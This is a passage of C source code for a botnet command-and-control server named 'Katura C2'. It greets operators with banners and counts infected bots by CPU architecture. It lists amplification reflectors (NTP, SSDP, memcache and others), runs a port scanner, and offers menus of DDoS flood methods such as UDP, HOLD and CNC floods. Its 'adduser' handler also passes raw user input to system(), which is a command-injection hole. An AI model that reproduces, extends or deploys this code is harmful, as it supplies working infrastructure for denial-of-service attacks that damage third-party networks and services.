        if(send(thefd, start_2, strlen(start_2), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, start_3, strlen(start_3), MSG_NOSIGNAL) == -1) goto end;
        sleep (2); 
        if(send(thefd, start_4, strlen(start_4), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;       // SEND EACH LINE AND SLEEP. USING \033[1A
        if(send(thefd, start_5, strlen(start_5), MSG_NOSIGNAL) == -1) goto end;
        sleep (2); 
        if(send(thefd, start_6, strlen(start_6), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, start_7, strlen(start_7), MSG_NOSIGNAL) == -1) goto end;
        sleep (2); 
        if(send(thefd, start_8, strlen(start_8), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;         
        if(send(thefd, start_9, strlen(start_9), MSG_NOSIGNAL) == -1) goto end;
        sleep (2); 
        if(send(thefd, start_10, strlen(start_10), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if(send(thefd, start_11, strlen(start_11), MSG_NOSIGNAL) == -1) goto end;
        sleep (5);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, katura_1, strlen(katura_1), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, katura_2, strlen(katura_2), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, katura_3, strlen(katura_3), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, katura_4, strlen(katura_4), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, katura_5, strlen(katura_5), MSG_NOSIGNAL) == -1) goto end; 
        while(1) 
        { // We are Displaying Attempting to display main banner!
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf); // We are Displaying Attempting to display main banner!
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        break; // World Break!
        } // We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        managements[thefd].connected = 1; // We are Displaying Attempting to display main banner!

      while(fdgets(buf, sizeof buf, thefd) > 0)
      {                                                                                       // function commands, MORE THE BETTER !!!
      if (strstr(buf, "bots") || strstr(buf, "BOTS") || strstr(buf, "botcount") || strstr(buf, "BOTCOUNT") || strstr(buf, "COUNT") || strstr(buf, "count")) 
      {
      if(strcmp(admin, accounts[find_line].access) == 0)
      {
      char total[128];
      char mips[128];
      char sh4[128];
      char arm[128];
      char ppc[128];               // || MEMCACHE || KATURA || RIP || TFTP || SNMP || DB2 || EFCT-PWR || NAT-PMP
      char x86[128];
      char spc[128];
      char ldap [5000];
      char ntp [5000];
      char ssdp [5000];
      char dns [5000];
      char reaper [5000];
      char mssql [5000];
      char portmap [5000];
      char ts3 [5000];
      char sentinel [5000];
      char db2 [5000];
      char efctpwr [5000];
      char katura [5000];
      char natpmp [5000];
      char memcache [5000];
      char rip [5000];
      char tftp [5000];
      char snmp [5000];
      sprintf(mips,     "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mmips     \x1b[38;5;196m[\x1b[38;5;50m%d\x1b[38;5;196m]\r\n", mipsConnected());
      sprintf(arm,      "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50marm      \x1b[38;5;196m[\x1b[38;5;50m%d\x1b[38;5;196m]\r\n", armConnected());  // DEVICE CONNECTED
      sprintf(sh4,      "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50msh4      \x1b[38;5;196m[\x1b[38;5;50m%d\x1b[38;5;196m]\r\n", sh4Connected());  // BOT COUNT FUNCTION
      sprintf(ppc,      "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mppc      \x1b[38;5;196m[\x1b[38;5;50m%d\x1b[38;5;196m]\r\n", ppcConnected());
      sprintf(x86,      "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mx86      \x1b[38;5;196m[\x1b[38;5;50m%d\x1b[38;5;196m]\r\n", x86Connected());
      sprintf(spc,      "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mspc      \x1b[38;5;196m[\x1b[38;5;50m%d\x1b[38;5;196m]\r\n", spcConnected());
      sprintf(total,    "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mttl      \x1b[38;5;196m[\x1b[38;5;50m%d\x1b[38;5;196m]\r\n", clientsConnected());
      sprintf(ldap,     "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mldap     \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n");
      sprintf(ntp,      "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mntp      \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n"); // We must finish this and add a reflection list
      sprintf(ssdp,     "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mssdp     \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n"); // reader! and display lines inside of said file
      sprintf(dns,      "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mdns      \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n"); // via katura.reaper [12412576234]
      sprintf(reaper,   "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mreaper   \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n");
      sprintf(mssql,    "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mmssql    \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n"); // \x1b[38;5;50m == cyan
      sprintf(portmap,  "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mportmap  \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n"); // \x1b[38;5;196m == red
      sprintf(ts3,      "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mts3      \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n");
      sprintf(sentinel, "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50msentinel \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n"); // Fixed the lower case K. May revert it tbh.
      sprintf(db2,      "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mdb2      \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n");
      sprintf(efctpwr,  "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mefct-pwr \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n");
      sprintf(katura,   "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mkatura   \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n");
      sprintf(natpmp,   "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mnat-pmp  \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n");
      sprintf(memcache, "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mmemcache \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n");
      sprintf(rip,      "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mrip      \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n");
      sprintf(tftp,     "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50mtftp     \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n");
      sprintf(snmp,     "\x1b[38;5;196mKatura\x1b[38;5;82m.\x1b[38;5;50msnmp     \x1b[38;5;196m[\x1b[38;5;50m0\x1b[38;5;196m]\r\n");
      if (send(thefd, mips, strlen(mips), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, sh4, strlen(sh4), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, arm, strlen(arm), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, ppc, strlen(ppc), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, x86, strlen(x86), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, spc, strlen(spc), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, total, strlen(total), MSG_NOSIGNAL) == -1) goto end;                     // \x1b[38;5;196m \x1b[38;5;50m
      if (send(thefd, ldap, strlen(ldap), MSG_NOSIGNAL) == -1) goto end;
		  if (send(thefd, ntp, strlen(ntp), MSG_NOSIGNAL) == -1) goto end;
		  if (send(thefd, ssdp, strlen(ssdp), MSG_NOSIGNAL) == -1) goto end;
		  if (send(thefd, dns, strlen(dns), MSG_NOSIGNAL) == -1) goto end;
		  if (send(thefd, reaper, strlen(reaper), MSG_NOSIGNAL) == -1) goto end;
		  if (send(thefd, mssql, strlen(mssql), MSG_NOSIGNAL) == -1) goto end;
		  if (send(thefd, portmap, strlen(portmap), MSG_NOSIGNAL) == -1) goto end;
		  if (send(thefd, ts3, strlen(ts3), MSG_NOSIGNAL) == -1) goto end;
		  if (send(thefd, sentinel, strlen(sentinel), MSG_NOSIGNAL) == -1) goto end;
		  if (send(thefd, db2, strlen(db2), MSG_NOSIGNAL) == -1) goto end;                              // added reflectors
		  if (send(thefd, efctpwr, strlen(efctpwr), MSG_NOSIGNAL) == -1) goto end;
		  if (send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
		  if (send(thefd, natpmp, strlen(natpmp), MSG_NOSIGNAL) == -1) goto end;
		  if (send(thefd, memcache, strlen(memcache), MSG_NOSIGNAL) == -1) goto end;
		  if (send(thefd, rip, strlen(rip), MSG_NOSIGNAL) == -1) goto end;
		  if (send(thefd, tftp, strlen(tftp), MSG_NOSIGNAL) == -1) goto end;
		  if (send(thefd, snmp, strlen(snmp), MSG_NOSIGNAL) == -1) goto end;
      }
        else
      {
        sprintf(katura, "\x1b[38;5;196mYou do \x1b[38;5;50mnot \x1b[38;5;196mhave the needed \x1b[38;5;50mpermissions to run this \x1b[38;5;50mcommand!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1);
      }
        }  
      if (strstr(buf, "resolve") || strstr(buf, "RESOLVE"))                                   // ip resolve function
      {
      char *ip[100];
      char *token = strtok(buf, " ");
      char *url = token+sizeof(token);
      trim(url);
      resolve(url, ip);                                                                       // resolve output (fixed)
          sprintf(katura, "\x1b[38;5;50mKatura Resolved \x1b[38;5;196m[ \x1b[38;5;50m%s \x1b[38;5;196m] \x1b[38;5;50mto \x1b[38;5;196m[ \x1b[38;5;50m%s \x1b[38;5;196m]\r\n", url, ip); // resolved ip, output information
          if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }
            if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))                              // add user function
    {
      if(strcmp(admin, accounts[find_line].access) == 0)
      {
        char *token = strtok(buf, " ");
        char *userinfo = token+sizeof(token);                                                 // edited jack's laziness 
        trim(userinfo);                                                                       // front lower case converted 
        char *uinfo[50];                                                                      // looks a lot better
        sprintf(uinfo, "echo '%s' >> katura.txt", userinfo);                                  // output user input
        system(uinfo);                                                                        // output information
        printf("\x1b[38;5;196m[ \x1b[38;5;50mKatura \x1b[38;5;196m] User\x1b[38;5;196m: [ \x1b[38;5;50m%s \x1b[38;5;196m] Added \x1b[38;5;50mUser\x1b[38;5;196m: [ \x1b[38;5;50m%s \x1b[38;5;196m]\n", accounts[find_line].username, userinfo);
        sprintf(katura, "\x1b[38;5;196m[ \x1b[38;5;50mKatura \x1b[38;5;196m] \x1b[38;5;50mUser\x1b[38;5;196m:[ \x1b[38;5;50m%s \x1b[38;5;196m] Added \x1b[38;5;50mUser\x1b[38;5;196m:[ \x1b[38;5;50m%s \x1b[38;5;196m]\r\n", accounts[find_line].username, userinfo);
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
      }
      else
      {
        sprintf(katura, "\x1b[38;5;196mYou do \x1b[38;5;50mnot \x1b[38;5;196mhave the needed \x1b[38;5;50mpermissions to run this \x1b[38;5;50mcommand!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1);
      }
        }
        else if(strstr(buf, "PORTSCAN") || strstr(buf, "portscan"))                            // portscan function
        {
            int x;
            int ps_timeout = 3;
            int least_port = 1;                                                                // least port
            int max_port = 65535;                                                              // most port
            char host[16];                                                                     // char each line
            trim(buf);
            char *token = strtok(buf, " ");
            snprintf(host, sizeof(host), "%s", token+strlen(token)+1);
            snprintf(katura, sizeof(katura), "\x1b[38;5;196m[ \x1b[38;5;50mKatura \x1b[38;5;196m] Checking \x1b[38;5;50mPorts \x1b[38;5;196m[ \x1b[38;5;50m%d \x1b[38;5;196m] Through [ \x1b[38;5;50m%d \x1b[38;5;196m] For \x1b[38;5;50mIP\x1b[38;5;196m:[ \x1b[38;5;50m%s \x1b[38;5;196m]\r\n", least_port, max_port, host);
            if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
            for(x=least_port; x < max_port; x++)
            {
                int Sock = -1;
                struct timeval timeout;
                struct sockaddr_in sock;
                // set timeout secs
                timeout.tv_sec = ps_timeout;
                timeout.tv_usec = 0;
                Sock = socket(AF_INET, SOCK_STREAM, 0);                                         // create our tcp socket
                setsockopt(Sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
                setsockopt(Sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
                sock.sin_family = AF_INET;
                sock.sin_port = htons(x);
                sock.sin_addr.s_addr = inet_addr(host);
                if(connect(Sock, (struct sockaddr *)&sock, sizeof(sock)) == -1) close(Sock);
                else
                {
                    snprintf(katura, sizeof(katura), "\x1b[38;5;196m[ \x1b[38;5;50mKatura \x1b[38;5;196m] \x1b[38;5;50mPort\x1b[38;5;196m:[ \x1b[38;5;50m%d \x1b[38;5;196m] is \x1b[38;5;50mOpen \x1b[38;5;196mFor \x1b[38;5;50mIP\x1b[38;5;196m:[ \x1b[38;5;50m%s \x1b[38;5;196m]\r\n", x, host);
                    if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
                    memset(katura, 0, sizeof(katura));
                    close(Sock);
                }
            }
            snprintf(katura, sizeof(katura), "\x1b[38;5;196m[ \x1b[38;5;50mKatura \x1b[38;5;196m] \x1b[38;5;50mScan \x1b[38;5;196mon \x1b[38;5;50mIP\x1b[38;5;196m:[ \x1b[38;5;50m%s \x1b[38;5;196m] is Done\x1b[38;5;196m!\r\n", host);       // output, scan is successfully done
            if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;                    // return
        }
        if(strstr(buf, "HELP") || strstr(buf, "help") || strstr(buf, "Help") || strstr(buf, "?"))  // help command options
        {
        char help_cmd1  [5000];                                                                    // char each line
        char help_line1  [5000];                                                                   // char each line
        char help_coms1  [5000];                                                                   // char each line
        char help_coms2  [5000];                                                                   // char each line
        char help_coms3  [5000];                                                                   // char each line
        char help_coms4  [5000];                                                                   // char each line
        char help_coms6  [5000];                                                                   // char each line
        char help_coms7  [5000];                                                                   // char each line
        char help_coms9  [5000];                                                                   // char each line
        char help_coms10  [5000];                                                                  // char each line
        char help_coms11  [5000];                                                                  // char each line
        char help_line3  [5000];                                                                   // char each line
                                                                             // \x1b[38;5;196m   \x1b[38;5;50m
        sprintf(help_cmd1,    "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m] All Commands \x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\r\n");        
        sprintf(help_line1,   "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");
        sprintf(help_coms1,   "\x1b[38;5;196m[\x1b[38;5;50mClear Screen\x1b[38;5;196m]         \x1b[38;5;50mCLEAR\r\n");
        sprintf(help_coms2,   "\x1b[38;5;196m[\x1b[38;5;50mLOGOUT\x1b[38;5;196m]               \x1b[38;5;50mLOGOUT\r\n");
        sprintf(help_coms3,   "\x1b[38;5;196m[\x1b[38;5;50mUsable Ports\x1b[38;5;196m]         \x1b[38;5;50mPORTS\r\n");
        sprintf(help_coms4,   "\x1b[38;5;196m[\x1b[38;5;50mRules\x1b[38;5;196m]                \x1b[38;5;50mRULES\r\n");
        sprintf(help_coms6,   "\x1b[38;5;196m[\x1b[38;5;50mTool Commands\x1b[38;5;196m]        \x1b[38;5;50mTOOLS\r\n");
        sprintf(help_coms7,   "\x1b[38;5;196m[\x1b[38;5;50mStaff Commands\x1b[38;5;196m]       \x1b[38;5;50mSTAFF\r\n");
        sprintf(help_coms9,   "\x1b[38;5;196m[\x1b[38;5;50mStressing Commands\x1b[38;5;196m]   \x1b[38;5;50mSTRESS\r\n");
        sprintf(help_coms10,  "\x1b[38;5;196m[\x1b[38;5;50mDisplay DeviceCount\x1b[38;5;196m]  \x1b[38;5;50mBOTS\r\n");   // fixed the grammar
        sprintf(help_coms11,  "\x1b[38;5;196m[\x1b[38;5;50mEXTRA Rules\x1b[38;5;196m]         \x1b[38;5;50mEXTRA\r\n");
        sprintf(help_line3,   "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");

        if(send(thefd, help_cmd1, strlen(help_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_line1, strlen(help_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms1, strlen(help_coms1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms2, strlen(help_coms2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms3, strlen(help_coms3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms4, strlen(help_coms4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms6, strlen(help_coms6),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms7, strlen(help_coms7),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms9, strlen(help_coms9),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms10, strlen(help_coms10),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms11, strlen(help_coms11),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_line3, strlen(help_line3),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf);
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "cls") || strstr(buf, "clear") || strstr(buf, "CLEAR") || strstr(buf, "CLS"))  
        {
        char clp_1  [5000];                                                                          // char every line
        char clp_2  [5000];                                                                          // char every line
        char clp_3  [5000];                                                                          // char every line
        char clp_4  [5000];                                                                          // char every line
        char clp_5  [5000];                                                                          // char every line

        sprintf(clp_1, "\x1b[38;5;50mKatura \x1b[38;5;196mI, \x1b[38;5;196m[\x1b[38;5;50mPrivate Source\x1b[38;5;196m]\r\n");
        sprintf(clp_2, "\x1b[38;5;196mProject: \x1b[38;5;50mKatura C2\r\n");
        sprintf(clp_3, "\x1b[38;5;196mVersion: \x1b[38;5;50mBeta\r\n");
        sprintf(clp_4, "\x1b[38;5;196mOS_Option(s): \x1b[38;5;50mCentOS \x1b[38;5;196m6.9 \x1b[38;5;50m- CentOS \x1b[38;5;196m7\r\n");
        sprintf(clp_5, "\x1b[38;5;196mDevelopers: \x1b[38;5;50mFlexingOnLamers \x1b[38;5;196m& \x1b[38;5;50mTransmissional.\r\n");
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, clp_1, strlen(clp_1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, clp_2, strlen(clp_2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, clp_3, strlen(clp_3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, clp_4, strlen(clp_4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, clp_5, strlen(clp_5),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf);
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "STRESS") || strstr(buf, "stress") || strstr(buf, "ddos") || strstr(buf, "DDOS")) 
        {
        char stress_cmd1  [5000];                                                                   // char every line
        char stress_line1  [5000];                                                                  // char every line
        char stress_udp1  [5000];                                                                   // char every line
        char stress_udp2  [5000];                                                                   // char every line  
        char stress_udp3  [5000];                                                                   // char every line
        char stress_udp4  [5000];                                                                   // char every line
        char stress_udp5  [5000];                                                                   // char every line
        char stress_line2  [5000];                                                                  // char every line
                                                                                 // \x1b[38;5;196m \x1b[38;5;50m
        sprintf(stress_cmd1,  "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m] \x1b[38;5;50mMethod Listings \x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\r\n");
        sprintf(stress_line1, "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");
        sprintf(stress_udp1,  "\x1b[38;5;196m[\x1b[38;5;50mLayer4 UDP\x1b[38;5;196m]               \x1b[38;5;50mL4UDP  \r\n");
        sprintf(stress_udp2,  "\x1b[38;5;196m[\x1b[38;5;50mLayer4 TCP\x1b[38;5;196m]               \x1b[38;5;50mL4TCP  \r\n");
        sprintf(stress_udp3,  "\x1b[38;5;196m[\x1b[38;5;50mLayer4 Spoofing\x1b[38;5;196m]          \x1b[38;5;50mL4SPOOF \r\n");
        sprintf(stress_udp4,  "\x1b[38;5;196m[\x1b[38;5;50mLayer7\x1b[38;5;196m]                   \x1b[38;5;50mL7  \r\n");
        sprintf(stress_udp5,  "\x1b[38;5;196m[\x1b[38;5;50mLayer7 Spoofing\x1b[38;5;196m]          \x1b[38;5;50mL7SPOOF  \r\n");
        sprintf(stress_line2, "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");  
        if(send(thefd, stress_cmd1, strlen(stress_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line1, strlen(stress_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_udp1, strlen(stress_udp1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_udp2, strlen(stress_udp2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_udp3, strlen(stress_udp3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_udp4, strlen(stress_udp4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_udp5, strlen(stress_udp5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line2, strlen(stress_line2),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf);
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "L4UDP") || strstr(buf, "l4udp") || strstr(buf, "l4UDP") || strstr(buf, "L4udp")) 
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char l4udp_cmd1  [5000];
        char l4udp_line1  [5000];
        char l4udp_udp1  [5000];                                                                   // char every line
        char l4udp_udp2  [5000];                                                                   // char every line
        char l4udp_udp3  [5000];                                                                   // char every line
        char l4udp_udp4  [5000];                                                                   // char every line
        char l4udp_udp5  [5000];                                                                   // char every line
        char l4udp_udp6  [5000];                                                                   // char every line
        char l4udp_udp7  [5000];                                                                   // char every line
        char l4udp_udp8  [5000];                                                                   // char every line
        char l4udp_line2  [5000];

        sprintf(l4udp_cmd1,  "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m] \x1b[38;5;50mLayer 4 UDP Listing \x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\r\n");
        sprintf(l4udp_line1, "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");
        sprintf(l4udp_udp1,  "\x1b[38;5;196m[\x1b[38;5;50mUDP Flood\x1b[38;5;196m]    \x1b[38;5;196m// \x1b[38;5;50mUDP   \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT] \x1b[38;5;196m[\x1b[38;5;50mTIME\x1b[38;5;196m] \x1b[38;5;50m32 0 1\r\n");
        sprintf(l4udp_udp2,  "\x1b[38;5;196m[\x1b[38;5;50mSTD Flood\x1b[38;5;196m]    \x1b[38;5;196m// \x1b[38;5;50mSTD   \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT] \x1b[38;5;196m[\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(l4udp_udp3,  "\x1b[38;5;196m[\x1b[38;5;50mHOLD Flood\x1b[38;5;196m]   \x1b[38;5;196m// \x1b[38;5;50mHOLD  \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT] \x1b[38;5;196m[\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(l4udp_udp4,  "\x1b[38;5;196m[\x1b[38;5;50mJUNK Flood\x1b[38;5;196m]   \x1b[38;5;196m// \x1b[38;5;50mJUNK  \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT] \x1b[38;5;196m[\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(l4udp_udp5,  "\x1b[38;5;196m[\x1b[38;5;50mCNC Flood\x1b[38;5;196m]    \x1b[38;5;196m// \x1b[38;5;50mCNC   \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mADMIN PORT\x1b[38;5;196m] \x1b[38;5;196m[\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(l4udp_udp6,  "\x1b[38;5;196m[\x1b[38;5;50mSTOMP Flood\x1b[38;5;196m]  \x1b[38;5;196m// \x1b[38;5;50mSTOMP \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT] \x1b[38;5;196m[\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(l4udp_udp7,  "\x1b[38;5;196m[\x1b[38;5;50mRAID Flood\x1b[38;5;196m]   \x1b[38;5;196m// \x1b[38;5;50mRAID  \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT] \x1b[38;5;196m[\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(l4udp_udp8,  "\x1b[38;5;196m[\x1b[38;5;50mHOME Flood\x1b[38;5;196m]   \x1b[38;5;196m// \x1b[38;5;50mHOME  \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT] \x1b[38;5;196m[\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(l4udp_line2, "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");     
        if(send(thefd, l4udp_cmd1, strlen(l4udp_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_line1, strlen(l4udp_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_udp1, strlen(l4udp_udp1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_udp2, strlen(l4udp_udp2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_udp3, strlen(l4udp_udp3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_udp4, strlen(l4udp_udp4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_udp5, strlen(l4udp_udp5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_udp6, strlen(l4udp_udp6),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_udp7, strlen(l4udp_udp7),   MSG_NOSIGNAL) == -1) goto end;        
        if(send(thefd, l4udp_udp8, strlen(l4udp_udp8),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_line2, strlen(l4udp_line2),   MSG_NOSIGNAL) == -1) goto end;
